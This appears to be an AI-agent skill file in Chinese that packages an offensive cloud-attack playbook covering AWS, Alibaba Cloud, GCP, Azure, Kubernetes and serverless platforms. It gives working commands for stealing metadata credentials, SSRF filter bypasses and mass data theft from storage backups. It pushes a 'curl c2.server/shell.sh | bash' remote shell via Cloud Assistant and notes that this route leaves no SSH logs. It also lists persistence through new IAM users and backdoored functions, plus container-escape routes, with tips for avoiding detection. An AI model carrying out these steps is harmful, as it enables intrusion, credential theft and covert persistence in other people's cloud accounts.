---
name: cloud-attack
description: 云安全攻击 — 覆盖AWS/阿里云/Azure/GCP。SSRF→Metadata→凭证窃取→横向移动→持久化。基于DEF CON 2026云安全培训和2025-2026实战案例。
user-invocable: true
---

# Cloud Attack — 云安全攻击

> 基于 DEF CON 2026 "Breaking the Cloud Layer" + 2025-2026 实战

## 路由

| 任务 | 调用 |
|------|------|
| Metadata 窃取 | → §1 Metadata |
| SSRF→云凭证 | → §2 SSRF |
| 阿里云横向移动 | → §3 Aliyun |
| AWS 横向移动 | → §4 AWS |
| K8s 攻击 | → §5 K8s |
| 无服务器攻击 | → §6 Serverless |

---

## §1 Metadata 窃取

### 1.1 各云平台 Metadata 端点
```bash
# AWS
curl http://169.254.169.254/latest/meta-data/
# AWS IMDSv2 (需要 Token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 阿里云
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>

# GCP
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"

# DigitalOcean
curl http://169.254.169.254/metadata/v1.json
```

### 1.2 Metadata 对象内容
```
实例 ID、内网 IP、MAC 地址
IAM/RAM 临时凭证 (AccessKey + SecretKey + Token)
用户数据 (可能包含初始化脚本/密码)
SSH 公钥
```

---

## §2 SSRF → 云凭证

### 2.1 DNS Rebinding 绕过 (CVE-2026-27127)
```
步骤1: 攻击者 DNS 第一次查询 → 返回正常 IP
步骤2: 校验通过
步骤3: DNS 缓存过期，第二次查询 → 返回 169.254.169.254
步骤4: 请求已发至 Metadata 端点 ← 窃取凭证
```

### 2.2 IPv6 映射绕过 (CVE-2026-42449)
```
http://[::ffff:169.254.169.254]
http://[::ffff:100.100.100.200]
```

### 2.3 11 种 IP 编码（完整版）
```
十进制:    http://2130706433
八进制:    http://0177.0.0.1  
十六进制:  http://0x7f.0x0.0x0.0x1
短IP:      http://127.1
IPv6:      http://[::1]
xip.io:    http://127.0.0.1.xip.io
DNS:       http://nip.io/127.0.0.1
```

---

## §3 阿里云横向移动

### 3.1 权限探测
```bash
# 获取当前身份
aliyun sts GetCallerIdentity
# 错误码反推权限
# AccessDenied = Deny Policy
# Forbidden.RiskControl = 已触发风控 ← 立即停止
```

### 3.2 路径一：云助手 (隐蔽)
```bash
# 无需 SSH Key，直接下发命令
aliyun ecs RunCommand \
  --InstanceId.1 i-xxxxx \
  --Type RunShellScript \
  --CommandContent "curl c2.server/shell.sh | bash"
# 优点: 无SSH登录日志，走云API通道
```

### 3.3 路径二：RDS 横向
```bash
# 从已控 ECS 直连 RDS（利用白名单信任）
mysql -h rm-xxxx.mysql.rds.aliyuncs.com -u app -p
# 通常 ECS IP ∈ RDS 白名单
```

### 3.4 路径三：OSS 遍历
```bash
# 遍历 Bucket 找备份文件
aliyun oss ls oss://bucket-name/
# 下载 SQL dump
aliyun oss cp oss://bucket-name/backup.sql ./
# 提取用户数据
grep "INSERT INTO users" backup.sql
```

### 3.5 路径四：VPC 穿越
```bash
# 检查云企业网
aliyun cbn DescribeCens
# 确认跨 VPC 连接 → 横向跳板
```

---

## §4 AWS 横向移动

### 4.1 权限枚举
```bash
# 获取当前用户
aws sts get-caller-identity
# 列出所有 IAM 用户
aws iam list-users
# 列出附加策略
aws iam list-attached-user-policies --user-name <name>
# 列出 S3 Bucket
aws s3 ls
# 列出 EC2 实例
aws ec2 describe-instances
```

### 4.2 提权路径
```
IAM 角色信任链 → STS AssumeRole → 更高权限
EC2 实例角色 → SSM RunCommand → 批量控制
Lambda 函数 → 修改代码注入后门
CloudFormation → 模板注入 → 资源创建
```

### 4.3 持久化
```
□ 创建新 IAM 用户 + AccessKey
□ 添加信任关系 (跨账号 AssumeRole)
□ Lambda 触发器 (定期执行)
□ SSM  Activation (跨区域持久化)
```

---

## §5 Kubernetes 攻击

### 5.1 信息收集
```bash
# 从 Pod 内访问 API Server
curl https://kubernetes.default.svc/api/v1/namespaces
# 读取 ServiceAccount Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# 环境变量中的密钥
env | grep -i secret
```

### 5.2 容器逃逸
```
□ 特权容器 → cgroup release_agent
□ Docker Socket 挂载 → docker exec
□ /proc 逃逸 → CVE-2019-5736
□ CAP_SYS_ADMIN → mount host
□ hostPID → nsenter host
□ hostNetwork → 网络逃逸
```

---

## §6 无服务器攻击

### 6.1 Lambda / 函数计算
```
□ 环境变量泄露 (API Key / DB密码)
□ 函数代码注入 (通过事件输入)
□ 权限过度 (函数角色)
□ 冷启动数据残留
□ 依赖漏洞 (过期的 SDK)
```

### 6.2 检测
```bash
# 查看环境变量
env
# 查看临时凭证
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
# 读函数源码
ls -la /var/task/
```

---

> **参考**: DEF CON 2026 "Breaking the Cloud Layer" + 阿里云横向实战 (2026)
> **工具**: aliyun CLI / aws CLI / Prowler / ScoutSuite / Trivy / kube-hunter
